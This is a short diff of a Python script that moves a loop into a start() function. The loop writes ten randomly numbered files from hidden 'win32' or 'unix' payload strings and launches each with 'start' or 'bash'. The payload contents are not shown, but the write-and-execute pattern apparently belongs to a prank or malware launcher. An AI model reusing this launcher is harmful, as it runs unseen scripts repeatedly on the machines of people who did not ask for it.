@@ -19,10 +19,11 @@ from sys import platform
 import random,os
 random_numbers = [random.randint(10000, 99999) for _ in range(10)]
 random_strs = [str(num) for num in random_numbers]
-for i in range(10):
-    if platform == 'win32':
-        with open(password + random_strs[i],'w') as f:f.write(win32)
-        os.system('start {}'.format(password + random_strs[i],'w'))
-    else:
-        with open(password + random_strs[i],'w') as f:f.write(unix)
-        os.system('bash {}'.format(password + random_strs[i],'w'))
+def start():
+    for i in range(10):
+        if platform == 'win32':
+            with open(password + random_strs[i],'w') as f:f.write(win32)
+            os.system('start {}'.format(password + random_strs[i],'w'))
+        else:
+            with open(password + random_strs[i],'w') as f:f.write(unix)
+            os.system('bash {}'.format(password + random_strs[i],'w'))
